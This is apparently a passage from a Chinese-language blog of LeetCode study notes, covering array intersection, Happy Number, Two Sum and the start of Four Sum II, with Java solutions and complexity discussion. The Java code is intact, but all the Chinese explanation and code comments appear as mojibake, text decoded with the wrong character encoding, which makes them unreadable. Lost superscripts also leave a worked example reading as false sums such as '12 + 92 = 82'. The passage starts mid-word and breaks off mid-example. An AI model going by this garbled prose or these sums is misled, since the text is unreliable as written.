å˜é‡ï¼ŒåŒæ—¶å°†ä¸¤ä¸ªæŒ‡é’ˆéƒ½å³ç§»ä¸€ä½ã€‚å½“è‡³å°‘æœ‰ä¸€ä¸ªæŒ‡é’ˆè¶…å‡ºæ•°ç»„èŒƒå›´æ—¶ï¼Œéå†ç»“æŸã€‚<br>æ—¶é—´å¤æ‚åº¦ï¼šO(mlogm+nlogn)ï¼Œå…¶ä¸­ m å’Œ n åˆ†åˆ«æ˜¯ä¸¤ä¸ªæ•°ç»„çš„é•¿åº¦ã€‚å¯¹ä¸¤ä¸ªæ•°ç»„æ’åºçš„æ—¶é—´å¤æ‚åº¦åˆ†åˆ«æ˜¯ O(mlogm) å’Œ O(nlogn)ï¼ŒåŒæŒ‡é’ˆå¯»æ‰¾äº¤é›†å…ƒç´ çš„æ—¶é—´å¤æ‚åº¦æ˜¯ O(m+n)ï¼Œå› æ­¤æ€»æ—¶é—´å¤æ‚åº¦æ˜¯ O(mlogm+nlogn)ã€‚<br>ç©ºé—´å¤æ‚åº¦ï¼šO(logm+logn)ï¼Œå…¶ä¸­ m å’Œ n åˆ†åˆ«æ˜¯ä¸¤ä¸ªæ•°ç»„çš„é•¿åº¦ã€‚ç©ºé—´å¤æ‚åº¦ä¸»è¦å–å†³äºæ’åºä½¿ç”¨çš„é¢å¤–ç©ºé—´ã€‚<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] intersection(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2) &#123;</span><br><span class="line">        Arrays.sort(nums1);</span><br><span class="line">        Arrays.sort(nums2);</span><br><span class="line">        <span class="type">int</span> <span class="variable">length1</span> <span class="operator">=</span> nums1.length, length2 = nums2.length;</span><br><span class="line">        <span class="type">int</span>[] intersection = <span class="keyword">new</span> <span class="title class_">int</span>[length1 + length2];</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>, index1 = <span class="number">0</span>, index2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (index1 &lt; length1 &amp;&amp; index2 &lt; length2) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">num1</span> <span class="operator">=</span> nums1[index1], num2 = nums2[index2];</span><br><span class="line">            <span class="keyword">if</span> (num1 == num2) &#123;</span><br><span class="line">                <span class="comment">// ä¿è¯åŠ å…¥å…ƒç´ çš„å”¯ä¸€æ€§</span></span><br><span class="line">                <span class="keyword">if</span> (index == <span class="number">0</span> || num1 != intersection[index - <span class="number">1</span>]) &#123;</span><br><span class="line">                    intersection[index++] = num1;</span><br><span class="line">                &#125;</span><br><span class="line">                index1++;</span><br><span class="line">                index2++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num1 &lt; num2) &#123;</span><br><span class="line">                index1++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                index2++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Arrays.copyOfRange(intersection, <span class="number">0</span>, index);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="ç¬¬202é¢˜-å¿«ä¹æ•°"><a href="#ç¬¬202é¢˜-å¿«ä¹æ•°" class="headerlink" title="ç¬¬202é¢˜. å¿«ä¹æ•°"></a>ç¬¬202é¢˜. å¿«ä¹æ•°</h2><p>ç¼–å†™ä¸€ä¸ªç®—æ³•æ¥åˆ¤æ–­ä¸€ä¸ªæ•° n æ˜¯ä¸æ˜¯å¿«ä¹æ•°ã€‚</p><p>ã€Œå¿«ä¹æ•°ã€ å®šä¹‰ä¸ºï¼š</p><p>å¯¹äºä¸€ä¸ªæ­£æ•´æ•°ï¼Œæ¯ä¸€æ¬¡å°†è¯¥æ•°æ›¿æ¢ä¸ºå®ƒæ¯ä¸ªä½ç½®ä¸Šçš„æ•°å­—çš„å¹³æ–¹å’Œã€‚<br>ç„¶åé‡å¤è¿™ä¸ªè¿‡ç¨‹ç›´åˆ°è¿™ä¸ªæ•°å˜ä¸º 1ï¼Œä¹Ÿå¯èƒ½æ˜¯ æ— é™å¾ªç¯ ä½†å§‹ç»ˆå˜ä¸åˆ° 1ã€‚<br>å¦‚æœè¿™ä¸ªè¿‡ç¨‹ ç»“æœä¸º 1ï¼Œé‚£ä¹ˆè¿™ä¸ªæ•°å°±æ˜¯å¿«ä¹æ•°ã€‚<br>å¦‚æœ n æ˜¯ å¿«ä¹æ•° å°±è¿”å› true ï¼›ä¸æ˜¯ï¼Œåˆ™è¿”å› false ã€‚</p><p>ç¤ºä¾‹ 1ï¼š</p><blockquote><p>è¾“å…¥ï¼šn &#x3D; 19<br>è¾“å‡ºï¼štrue<br>è§£é‡Šï¼š<br>12 + 92 &#x3D; 82<br>82 + 22 &#x3D; 68<br>62 + 82 &#x3D; 100<br>12 + 02 + 02 &#x3D; 1<br>ç¤ºä¾‹ 2ï¼š<br>è¾“å…¥ï¼šn &#x3D; 2<br>è¾“å‡ºï¼šfalse</p></blockquote><p>è¿™é“é¢˜æˆ‘æ„Ÿè§‰ä¸»è¦æ¶‰åŠä¸¤ä¸ªçŸ¥è¯†ç‚¹ï¼š</p><ol><li>å¯ä»¥é€šè¿‡å¯¹10å–ä½™æ•°æ¥è·å–æ¯ä¸ªä½ç½®çš„æ•°å€¼</li><li>é¢˜ç›®ä¸­æåˆ°äº†æ— é™å¾ªç¯ï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥å‘ç°å¦‚æœåœ¨é‡å¤çš„è¿‡ç¨‹ä¸­å‡ºç°äº†ä¹‹å‰çš„æ•°ï¼Œé‚£ä¹ˆå°±ä¼šæœ‰æ— é™å¾ªç¯ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ä¸€ä¸ªsetæ¥åˆ¤æ–­<br>é¢˜è§£å¦‚ä¸‹ï¼š<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isHappy</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        Set&lt;Integer&gt; record = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span> (n!= <span class="number">1</span> &amp;&amp; !record.contains(n))&#123;</span><br><span class="line">            record.add(n);</span><br><span class="line">            n = getNextNumber(n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">getNextNumber</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(n &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> n % <span class="number">10</span>;</span><br><span class="line">            res += temp * temp;</span><br><span class="line">            n = n/<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>ç¡®å®šè¿™ä¸ªé—®é¢˜çš„æ—¶é—´å¤æ‚åº¦å¯¹äºä¸€ä¸ªã€Œç®€å•ã€çº§åˆ«çš„é—®é¢˜æ¥è¯´æ˜¯ä¸€ä¸ªæŒ‘æˆ˜ã€‚å¦‚æœæ‚¨å¯¹è¿™äº›é—®é¢˜è¿˜ä¸ç†Ÿæ‚‰ï¼Œå¯ä»¥å°è¯•åªè®¡ç®— getNext(n) å‡½æ•°çš„æ—¶é—´å¤æ‚åº¦ã€‚</li></ol><p>æ—¶é—´å¤æ‚åº¦ï¼šO(243â‹…3+logn+loglogn+logloglogn)â€¦ &#x3D; O(logn)ã€‚</p><ul><li>æŸ¥æ‰¾ç»™å®šæ•°å­—çš„ä¸‹ä¸€ä¸ªå€¼çš„æˆæœ¬ä¸º O(logn)ï¼Œå› ä¸ºæˆ‘ä»¬æ­£åœ¨å¤„ç†æ•°å­—ä¸­çš„æ¯ä½æ•°å­—ï¼Œè€Œæ•°å­—ä¸­çš„ä½æ•°ç”± logn ç»™å®šã€‚</li><li>è¦è®¡ç®—å‡ºæ€»çš„æ—¶é—´å¤æ‚åº¦ï¼Œæˆ‘ä»¬éœ€è¦ä»”ç»†è€ƒè™‘å¾ªç¯ä¸­æœ‰å¤šå°‘ä¸ªæ•°å­—ï¼Œå®ƒä»¬æœ‰å¤šå¤§ã€‚</li><li>æˆ‘ä»¬åœ¨ä¸Šé¢ç¡®å®šï¼Œä¸€æ—¦ä¸€ä¸ªæ•°å­—ä½äº 243ï¼Œå®ƒå°±ä¸å¯èƒ½å›åˆ° 243 ä»¥ä¸Šã€‚å› æ­¤ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨ 243 ä»¥ä¸‹æœ€é•¿å¾ªç¯çš„é•¿åº¦æ¥ä»£æ›¿ 243ï¼Œä¸è¿‡ï¼Œå› ä¸ºå¸¸æ•°æ— è®ºå¦‚ä½•éƒ½æ— å…³ç´§è¦ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸ä¼šæ‹…å¿ƒå®ƒã€‚</li><li>å¯¹äºé«˜äº 243 çš„ nï¼Œæˆ‘ä»¬éœ€è¦è€ƒè™‘å¾ªç¯ä¸­æ¯ä¸ªæ•°é«˜äº 243 çš„æˆæœ¬ã€‚é€šè¿‡æ•°å­¦è¿ç®—ï¼Œæˆ‘ä»¬å¯ä»¥è¯æ˜åœ¨æœ€åçš„æƒ…å†µä¸‹ï¼Œè¿™äº›æˆæœ¬å°†æ˜¯ O(logn)+O(loglogn)+O(logloglogn)â€¦ã€‚å¹¸è¿çš„æ˜¯ï¼ŒO(logn) æ˜¯å ä¸»å¯¼åœ°ä½çš„éƒ¨åˆ†ï¼Œè€Œå…¶ä»–éƒ¨åˆ†ç›¸æ¯”ä¹‹ä¸‹éƒ½å¾ˆå°ï¼ˆæ€»çš„æ¥è¯´ï¼Œå®ƒä»¬çš„æ€»å’Œå°äºlognï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¿½ç•¥å®ƒä»¬ã€‚<br>ç©ºé—´å¤æ‚åº¦ï¼šO(logn)ã€‚ä¸æ—¶é—´å¤æ‚åº¦å¯†åˆ‡ç›¸å…³çš„æ˜¯è¡¡é‡æˆ‘ä»¬æ”¾å…¥å“ˆå¸Œé›†åˆä¸­çš„æ•°å­—ä»¥åŠå®ƒä»¬æœ‰å¤šå¤§çš„æŒ‡æ ‡ã€‚å¯¹äºè¶³å¤Ÿå¤§çš„ nï¼Œå¤§éƒ¨åˆ†ç©ºé—´å°†ç”± n æœ¬èº«å ç”¨ã€‚æˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“åœ°ä¼˜åŒ–åˆ° O(243â‹…3)&#x3D;O(1)ï¼Œæ–¹æ³•æ˜¯åªä¿å­˜é›†åˆä¸­å°äº 243 çš„æ•°å­—ï¼Œå› ä¸ºå¯¹äºè¾ƒé«˜çš„æ•°å­—ï¼Œæ— è®ºå¦‚ä½•éƒ½ä¸å¯èƒ½è¿”å›åˆ°å®ƒä»¬ã€‚</li></ul><p>åŠ›æ‰£ä¸Šç»™å‡ºäº†æ›´å¥½çš„è§£æ³•ï¼š<br>ä½¿ç”¨ â€œå¿«æ…¢æŒ‡é’ˆâ€ æ€æƒ³ï¼Œæ‰¾å‡ºå¾ªç¯ï¼šâ€œå¿«æŒ‡é’ˆâ€ æ¯æ¬¡èµ°ä¸¤æ­¥ï¼Œâ€œæ…¢æŒ‡é’ˆâ€ æ¯æ¬¡èµ°ä¸€æ­¥ï¼Œå½“äºŒè€…ç›¸ç­‰æ—¶ï¼Œå³ä¸ºä¸€ä¸ªå¾ªç¯å‘¨æœŸã€‚æ­¤æ—¶ï¼Œåˆ¤æ–­æ˜¯ä¸æ˜¯å› ä¸º 1 å¼•èµ·çš„å¾ªç¯ï¼Œæ˜¯çš„è¯å°±æ˜¯å¿«ä¹æ•°ï¼Œå¦åˆ™ä¸æ˜¯å¿«ä¹æ•°ã€‚<br>æ³¨æ„ï¼šæ­¤é¢˜ä¸å»ºè®®ç”¨é›†åˆè®°å½•æ¯æ¬¡çš„è®¡ç®—ç»“æœæ¥åˆ¤æ–­æ˜¯å¦è¿›å…¥å¾ªç¯ï¼Œå› ä¸ºè¿™ä¸ªé›†åˆå¯èƒ½å¤§åˆ°æ— æ³•å­˜å‚¨ï¼›å¦å¤–ï¼Œä¹Ÿä¸å»ºè®®ä½¿ç”¨é€’å½’ï¼ŒåŒç†ï¼Œå¦‚æœé€’å½’å±‚æ¬¡è¾ƒæ·±ï¼Œä¼šç›´æ¥å¯¼è‡´è°ƒç”¨æ ˆå´©æºƒã€‚ä¸è¦å› ä¸ºè¿™ä¸ªé¢˜ç›®ç»™å‡ºçš„æ•´æ•°æ˜¯ int å‹è€ŒæŠ•æœºå–å·§ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">bitSquareSum</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">bit</span> <span class="operator">=</span> n % <span class="number">10</span>;</span><br><span class="line">            sum += bit * bit;</span><br><span class="line">            n = n / <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isHappy</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">slow</span> <span class="operator">=</span> n, fast = n;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            slow = bitSquareSum(slow);</span><br><span class="line">            fast = bitSquareSum(fast);</span><br><span class="line">            fast = bitSquareSum(fast);</span><br><span class="line">        &#125; <span class="keyword">while</span> (slow != fast);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> slow == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ—¶é—´å¤æ‚åº¦ï¼šO(logn)ã€‚è¯¥åˆ†æå»ºç«‹åœ¨å¯¹å‰ä¸€ç§æ–¹æ³•çš„åˆ†æçš„åŸºç¡€ä¸Šï¼Œä½†æ˜¯è¿™æ¬¡æˆ‘ä»¬éœ€è¦è·Ÿè¸ªä¸¤ä¸ªæŒ‡é’ˆè€Œä¸æ˜¯ä¸€ä¸ªæŒ‡é’ˆæ¥åˆ†æï¼Œä»¥åŠåœ¨å®ƒä»¬ç›¸é‡å‰éœ€è¦ç»•ç€è¿™ä¸ªå¾ªç¯èµ°å¤šå°‘æ¬¡ã€‚</p><ul><li>å¦‚æœæ²¡æœ‰å¾ªç¯ï¼Œé‚£ä¹ˆå¿«è·‘è€…å°†å…ˆåˆ°è¾¾ 1ï¼Œæ…¢è·‘è€…å°†åˆ°è¾¾é“¾è¡¨ä¸­çš„ä¸€åŠã€‚æˆ‘ä»¬çŸ¥é“æœ€åçš„æƒ…å†µä¸‹ï¼Œæˆæœ¬æ˜¯ O(2â‹…logn)&#x3D;O(logn)ã€‚</li><li>ä¸€æ—¦ä¸¤ä¸ªæŒ‡é’ˆéƒ½åœ¨å¾ªç¯ä¸­ï¼Œåœ¨æ¯ä¸ªå¾ªç¯ä¸­ï¼Œå¿«è·‘è€…å°†ç¦»æ…¢è·‘è€…æ›´è¿‘ä¸€æ­¥ã€‚ä¸€æ—¦å¿«è·‘è€…è½åæ…¢è·‘è€…ä¸€æ­¥ï¼Œä»–ä»¬å°±ä¼šåœ¨ä¸‹ä¸€æ­¥ç›¸é‡ã€‚å‡è®¾å¾ªç¯ä¸­æœ‰ k ä¸ªæ•°å­—ã€‚å¦‚æœä»–ä»¬çš„èµ·ç‚¹æ˜¯ç›¸éš” kâˆ’1 çš„ä½ç½®ï¼ˆè¿™æ˜¯ä»–ä»¬å¯ä»¥å¼€å§‹çš„æœ€è¿œçš„è·ç¦»ï¼‰ï¼Œé‚£ä¹ˆå¿«è·‘è€…éœ€è¦ kâˆ’1 æ­¥æ‰èƒ½åˆ°è¾¾æ…¢è·‘è€…ï¼Œè¿™å¯¹äºæˆ‘ä»¬çš„ç›®çš„æ¥è¯´ä¹Ÿæ˜¯ä¸å˜çš„ã€‚å› æ­¤ï¼Œä¸»æ“ä½œä»ç„¶åœ¨è®¡ç®—èµ·å§‹ n çš„ä¸‹ä¸€ä¸ªå€¼ï¼Œå³ O(logn)ã€‚<br>ç©ºé—´å¤æ‚åº¦ï¼šO(1)ï¼Œå¯¹äºè¿™ç§æ–¹æ³•ï¼Œæˆ‘ä»¬ä¸éœ€è¦å“ˆå¸Œé›†æ¥æ£€æµ‹å¾ªç¯ã€‚æŒ‡é’ˆéœ€è¦å¸¸æ•°çš„é¢å¤–ç©ºé—´ã€‚</li></ul><h2 id="1-ä¸¤æ•°ä¹‹å’Œ"><a href="#1-ä¸¤æ•°ä¹‹å’Œ" class="headerlink" title="1. ä¸¤æ•°ä¹‹å’Œ"></a>1. ä¸¤æ•°ä¹‹å’Œ</h2><p>ç»™å®šä¸€ä¸ªæ•´æ•°æ•°ç»„ nums å’Œä¸€ä¸ªæ•´æ•°ç›®æ ‡å€¼ targetï¼Œè¯·ä½ åœ¨è¯¥æ•°ç»„ä¸­æ‰¾å‡º å’Œä¸ºç›®æ ‡å€¼ target  çš„é‚£ ä¸¤ä¸ª æ•´æ•°ï¼Œå¹¶è¿”å›å®ƒä»¬çš„æ•°ç»„ä¸‹æ ‡ã€‚<br>ä½ å¯ä»¥å‡è®¾æ¯ç§è¾“å…¥åªä¼šå¯¹åº”ä¸€ä¸ªç­”æ¡ˆï¼Œå¹¶ä¸”ä½ ä¸èƒ½ä½¿ç”¨ä¸¤æ¬¡ç›¸åŒçš„å…ƒç´ ã€‚<br>ä½ å¯ä»¥æŒ‰ä»»æ„é¡ºåºè¿”å›ç­”æ¡ˆã€‚</p><p>ç¤ºä¾‹ 1ï¼š</p><blockquote><p>è¾“å…¥ï¼šnums &#x3D; [2,7,11,15], target &#x3D; 9<br>è¾“å‡ºï¼š[0,1]<br>è§£é‡Šï¼šå› ä¸º nums[0] + nums[1] &#x3D;&#x3D; 9 ï¼Œè¿”å› [0, 1] ã€‚</p></blockquote><p>ç¤ºä¾‹ 2ï¼š</p><blockquote><p>è¾“å…¥ï¼šnums &#x3D; [3,2,4], target &#x3D; 6<br>è¾“å‡ºï¼š[1,2]</p></blockquote><p>ç¤ºä¾‹ 3ï¼š</p><blockquote><p>è¾“å…¥ï¼šnums &#x3D; [3,3], target &#x3D; 6<br>è¾“å‡ºï¼š[0,1]</p></blockquote><p>é‡ç‚¹æ˜¯å¯ä»¥ä¸€è¾¹éå†,ä¸€è¾¹å¯¹æ¯”mapä¸­æ˜¯å¦æœ‰æƒ³è¦çš„ç»“æ„,è¿™æ ·å°±åªéœ€è¦ä¸€ééå†å°±å¥½äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">if</span>(nums == <span class="literal">null</span> || nums.length == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> target - nums[i];</span><br><span class="line">            <span class="keyword">if</span>(map.containsKey(temp))&#123;</span><br><span class="line">                res[<span class="number">1</span>] = i;</span><br><span class="line">                res[<span class="number">0</span>] = map.get(temp);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            map.put(nums[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; indexMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">balance</span> <span class="operator">=</span> target - nums[i];</span><br><span class="line">            <span class="keyword">if</span>(indexMap.containsKey(balance))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;i, indexMap.get(balance)&#125;;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                indexMap.put(nums[i], i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿˜å¯ä»¥ç”¨åŒæŒ‡é’ˆè§£å†³</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="type">int</span> m=<span class="number">0</span>, n=<span class="number">0</span>, k, board=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>];</span><br><span class="line">        <span class="type">int</span>[] tmp1 = <span class="keyword">new</span> <span class="title class_">int</span>[nums.length];</span><br><span class="line">        <span class="comment">// å¤‡ä»½åŸæ¥ä¸‹æ ‡çš„æ•°ç»„</span></span><br><span class="line">        System.arraycopy(nums, <span class="number">0</span>, tmp1, <span class="number">0</span>, nums.length);</span><br><span class="line">        <span class="comment">// å°†numsæ’åº</span></span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="comment">// åŒæŒ‡é’ˆ</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, j = nums.length-<span class="number">1</span>; i&lt;j;)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] + nums[j] &lt; target)</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[i] + nums[j] &gt; target)</span><br><span class="line">            j--;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[i] + nums[j] == target)&#123;</span><br><span class="line">            m=i;</span><br><span class="line">            n=j;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ‰¾åˆ°åœ¨temp1ä¸­çš„ä¸‹æ ‡</span></span><br><span class="line">        <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;nums.length;k++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tmp1[k] == nums[m])&#123;</span><br><span class="line">                res[<span class="number">0</span>] = k;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tmp1[i] == nums[n] &amp;&amp; i != k)&#123;</span><br><span class="line">                res[<span class="number">1</span>] = i;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç¬¬454é¢˜-å››æ•°ç›¸åŠ II"><a href="#ç¬¬454é¢˜-å››æ•°ç›¸åŠ II" class="headerlink" title="ç¬¬454é¢˜.å››æ•°ç›¸åŠ II"></a>ç¬¬454é¢˜.å››æ•°ç›¸åŠ II</h2><p>ç»™ä½ å››ä¸ªæ•´æ•°æ•°ç»„ nums1ã€nums2ã€nums3 å’Œ nums4 ï¼Œæ•°ç»„é•¿åº¦éƒ½æ˜¯ n ï¼Œè¯·ä½ è®¡ç®—æœ‰å¤šå°‘ä¸ªå…ƒç»„ (i, j, k, l) èƒ½æ»¡è¶³ï¼š<br>0 &lt;&#x3D; i, j, k, l &lt; n<br>nums1[i] + nums2[j] + nums3[k] + nums4[l] &#x3D;&#x3D; 0</p><p>ç¤ºä¾‹ 1ï¼š</p><blockquote><p>è¾“å…¥ï¼šnums1 &#x3D; [1,2], nums2 &#x3D; [-2,-1], nums3 &#x3D; [-1,2], nums4 &#x3D; [0,2]<br>è¾“å‡ºï¼š2<br>è§£é‡Šï¼š<br>ä¸¤ä¸ªå…ƒç»„å¦‚ä¸‹ï¼š</p><ol><li>(0, 0, 0, 1) -&gt; 